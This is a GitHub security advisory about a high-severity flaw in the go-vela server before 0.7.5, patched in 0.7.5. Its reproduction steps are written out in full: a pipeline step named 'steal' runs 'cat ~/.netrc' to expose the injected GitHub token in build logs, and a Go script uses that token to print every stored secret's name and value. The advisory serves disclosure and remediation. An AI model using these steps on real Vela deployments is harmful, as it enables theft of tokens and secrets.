# Reject unauthorized access with GitHub PATs

High

[jbrockopp](/jbrockopp)
published
GHSA-8j3f-mhq8-gmh4
Apr 8, 2021

## Package

gomod

server
([Go](/advisories?query=ecosystem%3Ago))

## Affected versions

< 0.7.5

## Patched versions

0.7.5

## Description

### Impact

*What kind of vulnerability is it? Who is impacted?*

The additional auth mechanism added within [#246](https://github.com/go-vela/server/pull/246) enables some malicious user to obtain secrets utilizing the injected credentials within the `~/.netrc` file. Steps to reproduce:

1. Create Vela server
2. Login to Vela UI
3. Promote yourself to Vela administrator

   * `UPDATE users SET admin = 't' WHERE name = <username>`
4. Activate repository within Vela
5. Add `.vela.yml` to the repository with the following content

   ```
   version: "1"

   steps:
   - name: steal
     image: alpine
     commands:
       - cat ~/.netrc
   ```
6. Look at build logs to find the following content:

   ```
   $ cat ~/.netrc
   machine <GITHUB URL>
   login x-oauth-basic
   password <token>

   ```
7. Copy the password to be utilized in some later step
8. Add secret(s) to activated repo
9. Copy the following script into `main.go`

   ```
   package main

   import (
       "fmt"
       "github.com/go-vela/sdk-go/vela"
       "os"
   )

   func main() {
       // create client to connect to vela
       client, err := vela.NewClient(os.Getenv("VELA_SERVER_ADDR"), "vela", nil)
       if err != nil {
   	    panic(err)
       }

       // add PAT to request
       client.Authentication.SetPersonalAccessTokenAuth(os.Getenv("VELA_TOKEN"))

       secrets, _, err := client.Admin.Secret.GetAll(&vela.ListOptions{})
       if err != nil {
   	    panic(err)
       }

       for _, secret := range *secrets {
   	    fmt.Println(*secret.Name)
   	    fmt.Println(*secret.Value)
       }
   }
   ```
10. Run the `main.go` with environment specific settings

    * `VELA_SERVER_ADDR=http://localhost:8080 VELA_TOKEN=<token obtained previously> go run main.go`

The previously posted script could be updated to utilize any API endpoint(s) the activated user has access against.

### Patches

*Has the problem been patched? What versions should users upgrade to?*

* Upgrade to `v0.7.5` or later

### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

* No known workarounds

### References

*Are there any links users can visit to find out more?*

* [#246](https://github.com/go-vela/server/pull/246)

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
